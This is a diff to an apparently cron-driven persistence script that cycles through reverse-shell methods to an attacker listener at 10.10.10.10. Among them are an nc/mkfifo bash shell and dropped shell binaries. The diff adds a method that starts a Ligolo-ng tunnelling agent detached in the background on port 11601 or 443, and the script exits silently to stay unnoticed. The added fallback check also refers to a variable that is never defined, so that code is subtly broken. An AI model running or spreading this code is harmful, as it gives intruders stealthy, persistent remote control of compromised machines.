@@ -19,13 +19,21 @@
 LHOST="10.10.10.10"
 LPORT=9999
 TIMEOUT=5
+WORKDIR="/tmp"
+LIGOLO_PORT=11601
+LIGOLO_PORT_FALLBACK=443
+
+# ==============================================================================
+# WORKING DIRECTORY
+# All operations (temp pipes, agent binary lookups) resolve from here
+# ==============================================================================
+cd "$WORKDIR" 2>/dev/null || true
 
 # ==============================================================================
 # CHECK FOR EXISTING CONNECTION
 # Avoids spawning duplicate shells to the same listener
 # ==============================================================================
 connection_exists() {
-    # Try ss first (more commonly available on modern systems), fall back to netstat
     if command -v ss >/dev/null 2>&1; then
         ss -tn 2>/dev/null | grep -q "${LHOST}:${LPORT}" && return 0
     fi
@@ -60,7 +68,7 @@ try_nc_e() {
 # Note: no timeout wrapper - mkfifo approach is blocking by design
 try_nc_pipe() {
     if command -v nc >/dev/null 2>&1; then
-        PIPE=$(mktemp -u /tmp/.pipe_XXXXXX)
+        PIPE=$(mktemp -u "${WORKDIR}/.pipe_XXXXXX")
         rm -f "$PIPE"
         mkfifo "$PIPE" 2>/dev/null
         cat "$PIPE" | /bin/bash -i 2>&1 | nc "$LHOST" "$LPORT" >"$PIPE" 2>/dev/null
@@ -108,13 +116,43 @@ try_socat() {
 }
 
 # Method 9: Custom shell binary (msfvenom payload or similar)
-# Checks common writable locations
 try_shell_binary() {
-    for SHELL_PATH in /tmp/shell /dev/shm/shell /var/tmp/shell; do
+    for SHELL_PATH in "${WORKDIR}/shell" /dev/shm/shell /var/tmp/shell; do
         if [ -f "$SHELL_PATH" ] && [ -x "$SHELL_PATH" ]; then
             timeout "$TIMEOUT" "$SHELL_PATH" 2>/dev/null && exit 0
         fi
     done
+}
+
+# Method 10: Ligolo-ng agent
+# Tries default ligolo port first (11601), falls back to 443
+# Looks for agent binary in WORKDIR; runs in background and detaches
+try_ligolo() {
+    AGENT_PATH="${WORKDIR}/agent"
+    if [ ! -f "$AGENT_PATH" ] || [ ! -x "$AGENT_PATH" ]; then
+        return
+    fi
+
+    # Check if a ligolo tunnel is already up (agent process already running)
+    if pgrep -x agent >/dev/null 2>&1; then
+        return
+    fi
+
+    # Try primary ligolo port
+    if timeout "$TIMEOUT" bash -c ">/dev/tcp/$LHOST/$LIGOLO_PORT" 2>/dev/null; then
+        nohup "$AGENT_PATH" -connect "${LHOST}:${LIGOLO_PORT}" -ignore-cert \
+            >/dev/null 2>&1 &
+        disown
+        return
+    fi
+
+    # Fall back to 443
+    if timeout "$TIMEOUT" bash -c ">/dev/tcp/$LHOST/$LIGOLO_FALLBACK_PORT" 2>/dev/null; then
+        nohup "$AGENT_PATH" -connect "${LHOST}:${LIGOLO_PORT_FALLBACK}" -ignore-cert \
+            >/dev/null 2>&1 &
+        disown
+        return
+    fi
 }
 
 # ==============================================================================
@@ -129,6 +167,7 @@ try_php
 try_ruby
 try_socat
 try_shell_binary
+try_ligolo
 
 # All methods failed - exit cleanly so cron doesn't generate noise
 exit 0
